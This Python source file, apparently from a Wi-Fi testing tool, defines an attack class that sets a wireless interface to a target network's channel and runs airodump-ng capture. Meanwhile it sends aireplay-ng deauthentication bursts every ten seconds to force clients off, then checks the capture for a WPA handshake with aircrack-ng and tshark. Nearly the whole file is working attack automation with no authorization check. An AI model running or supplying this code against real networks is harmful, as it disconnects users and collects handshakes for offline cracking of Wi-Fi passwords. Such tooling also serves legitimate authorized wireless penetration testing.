import glob
import os
import re
import subprocess
import threading
import time
from datetime import datetime
from typing import Callable, Optional

from wifi_auto_test.core.models import WiFiNetwork, TestResult, TestStatus
from wifi_auto_test.utils.process_runner import ProcessRunner
from .interfaces import IAttackEngine


class AirodumpAttack(IAttackEngine):
    """Fallback attack via airodump-ng + aireplay-ng deauth when hcxdumptool is unavailable."""

    def __init__(
        self,
        interface: str,
        output_dir: str,
        timeout: int,
        process_runner: ProcessRunner,
        logger: Optional[Callable[[str], None]] = None,
    ):
        self._interface = interface
        self._output_dir = output_dir
        self._timeout = timeout
        self._runner = process_runner
        self._log: Callable[[str], None] = logger or (lambda x: None)
        os.makedirs(self._output_dir, exist_ok=True)

    def _has_handshake(self, cap_path: str, bssid: str) -> bool:
        """Check capture file for WPA handshake using aircrack-ng."""
        # aircrack-ng -b <bssid> <cap> prints handshake info to stderr
        result = subprocess.run(
            ["aircrack-ng", cap_path, "-b", bssid],
            capture_output=True, text=True,
            timeout=30,
        )
        output = result.stdout + result.stderr
        # aircrack-ng reports: "WPA (1 handshake)" or "WPA (0 handshake)"
        # Or: "WPA (1 handshake, with PMKID)"
        m = re.search(r"WPA \((\d+) handshake", output, re.IGNORECASE)
        if m and int(m.group(1)) > 0:
            return True
        # Alternative: check for EAPOL frames with tshark
        result2 = subprocess.run(
            ["tshark", "-r", cap_path, "-Y", f"eapol && wlan.ra == {bssid.lower()}", "-T", "fields", "-e", "frame.number"],
            capture_output=True, text=True,
            timeout=30,
        )
        # Need at least 2 EAPOL frames for a handshake (ideally 4)
        eapol_count = len([l for l in result2.stdout.strip().split("\n") if l.strip()])
        return eapol_count >= 2

    def run(self, network: WiFiNetwork) -> TestResult:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_ssid = re.sub(r"[^\w\-]", "_", network.ssid or "hidden")
        prefix = f"{self._output_dir}/{timestamp}_{safe_ssid}_{network.bssid.replace(':', '')}"

        channel = network.channel if network.channel > 0 else 1

        # Ensure monitor interface is on target channel
        subprocess.run(
            ["sudo", "iw", "dev", self._interface, "set", "channel", str(channel)],
            capture_output=True,
        )

        # Start airodump-ng (ncurses UI — no useful stdout, capture to file only)
        airodump_cmd = [
            "sudo", "airodump-ng",
            "-c", str(channel),
            "--bssid", network.bssid,
            "-w", prefix,
            "--output-format", "pcap",
            "--write-interval", "1",
            "--ignore-negative-one",
            self._interface,
        ]

        log_lines: list[str] = []
        airodump_proc = subprocess.Popen(
            airodump_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
            text=True,
        )

        # Read stderr for any useful errors
        def _read_stderr():
            if airodump_proc.stderr:
                for line in iter(airodump_proc.stderr.readline, ""):
                    if line:
                        log_lines.append(line.strip())

        stderr_thread = threading.Thread(target=_read_stderr, daemon=True)
        stderr_thread.start()

        # Periodic deauth every 10s
        deauth_stop = threading.Event()
        def _deauth_loop():
            while not deauth_stop.is_set():
                self._log(f"[*] Sending deauth burst to {network.ssid} ({network.bssid}) ch{channel}")
                try:
                    subprocess.run(
                        ["sudo", "aireplay-ng", "-0", "5", "-a", network.bssid, self._interface],
                        capture_output=True, timeout=15,
                    )
                except Exception as e:
                    self._log(f"[!] aireplay-ng error: {e}")
                deauth_stop.wait(10)

        deauth_thread = threading.Thread(target=_deauth_loop, daemon=True)
        deauth_thread.start()

        self._log(f"[*] Запуск airodump-ng на {network.ssid} (ch {channel}, {network.bssid})")

        # Run for timeout seconds, then stop
        time.sleep(self._timeout)
        airodump_proc.terminate()
        try:
            airodump_proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            airodump_proc.kill()
            airodump_proc.wait(timeout=1)
        deauth_stop.set()
        stderr_thread.join(timeout=2)

        # Find and analyze capture file
        pcap_files = glob.glob(prefix + "-*.cap")
        pcap_file = pcap_files[0] if pcap_files else None
        handshake_found = False

        if pcap_file and os.path.exists(pcap_file) and os.path.getsize(pcap_file) > 0:
            try:
                handshake_found = self._has_handshake(pcap_file, network.bssid)
                if handshake_found:
                    self._log(f"[+] WPA handshake found in {pcap_file}")
                else:
                    self._log(f"[*] No handshake in capture ({os.path.getsize(pcap_file)} bytes)")
            except Exception as e:
                self._log(f"[!] Failed to analyze capture: {e}")

        status = TestStatus.SUCCESS if handshake_found else TestStatus.TIMEOUT

        # Clean up on failure
        if not handshake_found:
            for f in glob.glob(prefix + "*"):
                try:
                    os.remove(f)
                except OSError:
                    pass
            pcap_file = None

        return TestResult(
            network=network,
            status=status,
            pcap_file=pcap_file,
            captured_frames="WPA_HANDSHAKE" if handshake_found else None,
            log_excerpt="\n".join(log_lines[-20:]),
        )
